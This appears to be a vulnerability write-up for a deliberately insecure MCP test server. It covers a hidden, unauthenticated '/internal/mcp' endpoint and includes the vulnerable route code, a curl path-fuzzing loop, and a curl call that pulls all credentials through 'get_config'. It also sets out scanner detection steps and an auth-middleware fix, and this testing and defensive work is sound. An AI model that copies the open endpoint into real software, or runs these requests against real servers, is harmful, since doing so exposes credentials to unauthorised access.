# Shadow MCP Endpoint — OWASP MCP09 / CWE-284

## Description

The server exposes a third MCP endpoint at `/internal/mcp` that is **not listed** in
the `GET /mcp` discovery response. It has no authentication check and provides full
access to all tools and MCP methods.

Unlike `/mcp-admin` (which is advertised in the discovery manifest and demonstrates
broken access control), `/internal/mcp` is a true **shadow endpoint**: a scanner must
discover it by path fuzzing or crawling rather than by reading the documented API.

This demonstrates **OWASP MCP09: Shadow MCP Servers**: unapproved or forgotten
endpoints that exist outside formal security governance, reachable without
authentication, and invisible to standard discovery mechanisms.

## CWE

[CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)

## Vulnerable Code

```python
# server.py
async def mcp_internal_endpoint(request: Request) -> JSONResponse:
    """Shadow MCP endpoint — not advertised in GET /mcp discovery."""
    return await _handle(request)   # full tool access, no auth check

app = Starlette(routes=[
    Route("/mcp",          mcp_endpoint,          methods=["GET", "POST"]),
    Route("/mcp-admin",    mcp_admin_endpoint,    methods=["GET", "POST"]),
    Route("/internal/mcp", mcp_internal_endpoint, methods=["GET", "POST"]),  # shadow
])
```

Note that `GET /mcp` only advertises `/mcp` and `/mcp-admin` — `/internal/mcp` is absent:

```json
{
  "endpoints": {
    "/mcp":       "Standard MCP endpoint — requires Authorization: Bearer <token>",
    "/mcp-admin": "Admin endpoint — VULNERABLE: does not check Authorization header"
  }
}
```

## Contrast with `/mcp-admin`

| | `/mcp-admin` | `/internal/mcp` |
|---|---|---|
| Listed in `GET /mcp` discovery | Yes | **No** |
| Auth check | None | None |
| Discovery method | Read manifest | Path fuzzing / crawling |
| OWASP category | MCP07 (broken authz) | MCP09 (shadow endpoint) |

## Example: Discover via fuzzing, then exploit

```bash
# Step 1: GET /mcp shows only /mcp and /mcp-admin
curl http://localhost:8000/mcp

# Step 2: fuzz common internal path patterns
for path in /internal/mcp /api/mcp /admin/mcp /debug/mcp /v1/mcp; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Content-Type: application/json" \
    -d '{"jsonrpc":"2.0","method":"ping","params":{},"id":1}' \
    "http://localhost:8000$path")
  echo "$path → $status"
done
```

Expected output:

```
/internal/mcp → 200
/api/mcp      → 404
/admin/mcp    → 404
/debug/mcp    → 404
/v1/mcp       → 404
```

### Exploit: full tool access without auth

```bash
curl -s http://localhost:8000/internal/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"get_config","arguments":{}},"id":1}'
```

Returns all credentials, even when `/mcp` requires `Authorization: Bearer <token>`.

## ZAP Detection

ZAP should:

1. Spider/fuzz common path patterns (`/internal/*`, `/api/*`, `/debug/*`, `/v1/*`).
2. Send a valid MCP JSON-RPC probe (`ping` or `tools/list`) to each discovered path.
3. Compare the response to a known-401 response from `/mcp` (when auth is configured).
4. Flag any path that returns a valid MCP JSON-RPC response without requiring the
   Authorization header.

## Secure Fix

Register all endpoints in the discovery manifest and apply auth uniformly — ideally
via middleware so no route can accidentally bypass it:

```python
from starlette.middleware.base import BaseHTTPMiddleware

class AuthMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        if AUTH_TOKEN and request.method == "POST":
            if request.headers.get("Authorization") != f"Bearer {AUTH_TOKEN}":
                return JSONResponse(..., status_code=401)
        return await call_next(request)

app.add_middleware(AuthMiddleware)
```
